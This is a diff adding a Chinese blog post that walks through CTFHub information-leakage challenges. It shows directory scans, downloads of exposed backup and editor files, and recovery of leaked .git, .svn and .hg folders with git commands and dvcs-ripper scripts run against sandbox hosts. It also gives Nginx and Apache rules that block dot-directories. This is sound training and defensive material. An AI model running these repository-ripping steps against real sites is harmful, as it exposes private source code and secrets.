@@ -288,6 +288,219 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/26/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="花间一壶酒">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/02/26/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" itemprop="url">信息泄露（ctfhub）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-02-26T22:17:45+08:00">
+                2021-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="https://img-blog.csdnimg.cn/20210226163930826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210226164208801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>翻到<code>/4/2</code>发现<code>flag.txt</code>。<br><img src="https://img-blog.csdnimg.cn/20210226164251703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开即得flag：ctfhub{cbea62a29562fc98d70ac63c}</p>
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><img src="https://img-blog.csdnimg.cn/20210226164411692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入使用<code>ctrl+f</code>搜索关键词flag找到。<br><img src="https://img-blog.csdnimg.cn/20210226164553891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{63d000d45fd5de76f678580c} </p>
+<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/20210226164731982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目录扫描</p>
+<p><img src="https://img-blog.csdnimg.cn/20210226165218580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现<code>www.zip</code><br>下载打开发现<br><img src="https://img-blog.csdnimg.cn/20210226165350126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接在地址栏址访问<code>flag_14391792.txt</code><br><img src="https://img-blog.csdnimg.cn/20210226165455551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{8158b72890f75d5b8c7ab9fb}</p>
+<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/2021022616565847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目录扫描</p>
+<p><img src="https://img-blog.csdnimg.cn/20210226165822782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现<code>index.php.bak</code>，下载并打开</p>
+<p><img src="https://img-blog.csdnimg.cn/20210226165942867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{bd76a4003c73ad6b158a12c0}</p>
+<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/20210226170200904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>目录扫描<br><img src="https://img-blog.csdnimg.cn/20210226170246426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现<code>.index.php.swp</code>，下载并打开<br><img src="https://img-blog.csdnimg.cn/20210226170437738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{177e6ae8c28bf366655afece}</p>
+<p><strong>注意：vim会自动生成备份文件和临时文件，如果程序正常退出，临时文件会自动删除，如果意外退出就会保存，文件名为.filename.swp（第一次产生文件的后缀名为.swp;再次意外退出产生文件的后缀名为.swo;第三次产生的后缀名为.swn）</strong></p>
+<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。<br><img src="https://img-blog.csdnimg.cn/20210226170719829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目录扫描<br><img src="https://img-blog.csdnimg.cn/20210226170851820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有发现，直接访问<code>.DS_Store</code>，下载并打开<br><img src="https://img-blog.csdnimg.cn/20210226172033707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从地址栏访问dce0d87790a32b57b5ac96ba6d7886ad.txt，发现flag。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210226172326449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{f7bdb52fd88d3199ae358544}</p>
+<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
+<h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p><img src="https://img-blog.csdnimg.cn/20210226172609449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目录扫描<br><img src="https://img-blog.csdnimg.cn/20210226172707178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>确定是.git源码泄露，使用Githack克隆目录。<br><img src="https://img-blog.csdnimg.cn/20210226200457964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>既然提示了log那就查看log记录。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span><span class="comment">//显示从最近到最远的提交日志。</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210226223234395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现有添加过flag的记录。</p>
+<p>方法一</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210226223621498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>ctfhub{b5b17fa3b60f529512e64bb8}</p>
+<p>方法二</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard &lt;commit&gt;<span class="comment">//可用于回退版本库</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210226224403529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>ctfhub{b5b17fa3b60f529512e64bb8}</p>
+<p>方法三</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff &lt;commit&gt;<span class="comment">//比较现版本与上一版本的区别得到flag</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210226225159327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ctfhub{b5b17fa3b60f529512e64bb8}</p>
+<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p><img src="https://img-blog.csdnimg.cn/20210226225310626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>克隆到本地，在<code>/.git/refs</code>下找到stash文件。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stash可以理解为git的缓存文件。</span><br></pre></td></tr></table></figure>
+<p>打开stash文件得到版本号信息。<br><img src="https://img-blog.csdnimg.cn/20210226230104421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法一</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff bdc1715baf7d9d1750dc5ed9634efacd518bff31</span><br></pre></td></tr></table></figure>
+<p>得到flag。<br><img src="https://img-blog.csdnimg.cn/20210226230238771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法二</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard bdc1715baf7d9d1750dc5ed9634efacd518bff31</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210226230407598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p>
+<p>ctfhub{976f200db67c4fa91c122edd}</p>
+<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="https://img-blog.csdnimg.cn/20210226230517825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210226230738955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>克隆到本地即发现flag。</p>
+<p>ctfhub{6861d48659b3876130980e58}</p>
+<h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p><img src="https://img-blog.csdnimg.cn/2021022623112423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>目录扫描出现<code>.svn</code>。</p>
+<p>1）什么是SVN<br>SVN是subversion的缩写，是一个开放源代码的版本控制系统，通过采用分支管理系统的高效管理，简而言之就是用于多个人共同开发同一个项目，实现共享资源，实现最终集中式的管理。</p>
+<p>2）漏洞成因<br>在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。<br>在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。</p>
+<p>3）漏洞修复<br>方案一、不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p>
+<p>方案二、服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn和.git目录，下面示范为禁止访问点号开头的目录。</p>
+<p>Nginx的vhosts中配置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location ~ (/\.)&#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Apache的vhosts中配置</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory ~ <span class="string">&quot;/\.&quot;</span>&gt;</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p>题解：</p>
+<p>恢复.svn</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -u http:<span class="comment">//challenge-326f696e515c072a.sandbox.ctfhub.com:10080/.svn/</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021022623264395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.svn目录，查找flag。<br><img src="https://img-blog.csdnimg.cn/20210226233458802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper]</span><br><span class="line">└─# ./rip-svn.pl -u http:<span class="comment">//challenge-326f696e515c072a.sandbox.ctfhub.com:10080/.svn </span></span><br><span class="line">[i] Found <span class="keyword">new</span> SVN client storage format!</span><br><span class="line">REP INFO =&gt; <span class="number">1</span>:file:<span class="comment">///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33</span></span><br><span class="line">[i] Trying to revert the tree, <span class="keyword">if</span> you get error, upgrade your SVN client!</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line">hg-decode.pl  LICENSE    rip-bzr.pl  rip-git.pl  rip-svn.pl</span><br><span class="line">index.html    README.md  rip-cvs.pl  rip-hg.pl</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper]</span><br><span class="line">└─<span class="meta"># ls -a</span></span><br><span class="line">.     .gitignore    LICENSE     rip-cvs.pl  rip-svn.pl</span><br><span class="line">..    hg-decode.pl  README.md   rip-git.pl  .svn</span><br><span class="line">.git  index.html    rip-bzr.pl  rip-hg.pl</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper]</span><br><span class="line">└─<span class="meta"># cd .svn                                              </span></span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.svn]</span><br><span class="line">└─<span class="meta"># ls   </span></span><br><span class="line">entries  format  pristine  text-base  tmp  wc.db  wc.db-journal</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.svn]</span><br><span class="line">└─<span class="meta"># cd pristine/</span></span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.svn/pristine]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line"><span class="number">01</span>  bf</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.svn/pristine]</span><br><span class="line">└─<span class="meta"># cd 01/      </span></span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/…/dvcs-ripper/.svn/pristine/<span class="number">01</span>]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line"><span class="number">014312</span>db426b1bb9313f78cf4800dc703d2dd698.svn-base</span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/…/dvcs-ripper/.svn/pristine/<span class="number">01</span>]</span><br><span class="line">└─<span class="meta"># cat 014312db426b1bb9313f78cf4800dc703d2dd698.svn-base</span></span><br><span class="line">ctfhub&#123;cfa787eb4e9856b718bd64b7&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/batsing/p/svn-bug.html">https://www.cnblogs.com/batsing/p/svn-bug.html</a>             </p>
+<h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p><img src="https://img-blog.csdnimg.cn/20210226233755156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>目录扫描出现<code>.hg</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.hg源码泄漏</span><br><span class="line">漏洞成因：</span><br><span class="line">hg init的时候会生成.hg</span><br><span class="line">e.g.http:<span class="comment">//www.am0s.com/.hg/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper]</span><br><span class="line">└─# ./rip-hg.pl -v -u http:<span class="comment">//challenge-70aea54b99805e33.sandbox.ctfhub.com:10080/.hg/</span></span><br><span class="line">[i] Downloading hg files from http:<span class="comment">//challenge-70aea54b99805e33.sandbox.ctfhub.com:10080/.hg/</span></span><br><span class="line">[i] Auto-detecting <span class="number">404</span> as <span class="number">200</span> with <span class="number">3</span> requests</span><br><span class="line">[i] Getting correct <span class="number">404</span> responses</span><br><span class="line">[d] found <span class="number">00</span>changelog.i</span><br><span class="line">[d] found dirstate</span><br><span class="line">[d] found <span class="keyword">requires</span></span><br><span class="line">[!] Not found <span class="keyword">for</span> branch: <span class="number">404</span> Not Found</span><br><span class="line">[!] Not found <span class="keyword">for</span> branchheads.cache: <span class="number">404</span> Not Found</span><br><span class="line">[d] found last-message.txt</span><br><span class="line">[!] Not found <span class="keyword">for</span> tags.cache: <span class="number">404</span> Not Found</span><br><span class="line">[d] found undo.branch</span><br><span class="line">[d] found undo.desc</span><br><span class="line">[d] found undo.dirstate</span><br><span class="line">[d] found store/<span class="number">00</span>changelog.i</span><br><span class="line">[!] Not found <span class="keyword">for</span> store/<span class="number">00</span>changelog.d: <span class="number">404</span> Not Found</span><br><span class="line">[d] found store/<span class="number">00</span>manifest.i</span><br><span class="line">[!] Not found <span class="keyword">for</span> store/<span class="number">00</span>manifest.d: <span class="number">404</span> Not Found</span><br><span class="line">[d] found store/fncache</span><br><span class="line">[d] found store/undo</span><br><span class="line">[!] Not found <span class="keyword">for</span> .hgignore: <span class="number">404</span> Not Found</span><br><span class="line">[i] Running hg status to check <span class="keyword">for</span> missing items</span><br><span class="line">cannot find hg: No such file <span class="keyword">or</span> directory at ./rip-hg.pl line <span class="number">140.</span></span><br></pre></td></tr></table></figure>
+<p>打开<code>.hg</code>文件夹。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper]</span><br><span class="line">└─<span class="meta"># cd .hg                                                             1 ⨯</span></span><br><span class="line">                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.hg]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line"><span class="number">00</span>changelog.i  last-message.txt  store        undo.desc</span><br><span class="line">dirstate       <span class="keyword">requires</span>          undo.branch  undo.dirstate</span><br></pre></td></tr></table></figure>
+<p>查看到其中有last-message.txt文件，查看其内容：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.hg]</span><br><span class="line">└─<span class="meta"># cat last-message.txt                                               1 ⨯</span></span><br><span class="line">add flag                                                                           </span><br></pre></td></tr></table></figure>
+<p>存在有flag为开头的文件，使用<code>grep -r flag *</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/asdfghjkl/dvcs-ripper/.hg]</span><br><span class="line">└─<span class="meta"># grep -r flag *</span></span><br><span class="line">匹配到二进制文件 dirstate</span><br><span class="line">last-message.txt:add flag</span><br><span class="line">匹配到二进制文件 store/undo</span><br><span class="line">store/fncache:data/flag_104634908.txt.i</span><br><span class="line">匹配到二进制文件 store/<span class="number">00</span>manifest.i</span><br><span class="line">匹配到二进制文件 undo.dirstate</span><br></pre></td></tr></table></figure>
